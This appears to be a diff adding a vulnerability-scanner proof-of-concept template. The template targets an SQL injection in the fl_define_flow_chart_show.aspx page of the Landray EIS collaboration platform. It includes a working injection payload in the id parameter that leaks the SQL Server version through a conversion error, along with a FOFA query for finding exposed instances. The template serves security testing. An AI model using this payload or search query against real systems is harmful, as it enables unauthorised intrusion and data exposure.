@@ -1,0 +1,15 @@
+id: poc-yaml-landray-eis-fl-define-flow-chart-show-sqli
+info:
+  name: 蓝凌EIS智慧协同平台 fl_define_flow_chart_show sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 蓝凌EIS
+  fofa: app="Landray-EIS智慧协同平台"
+requests:
+- method: GET
+  path: /flow/fl_define_flow_chart_show.aspx?id=1%20and%201=@@version--+
+  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"在将 nvarchar 值")
+variables: {}
+transport: http
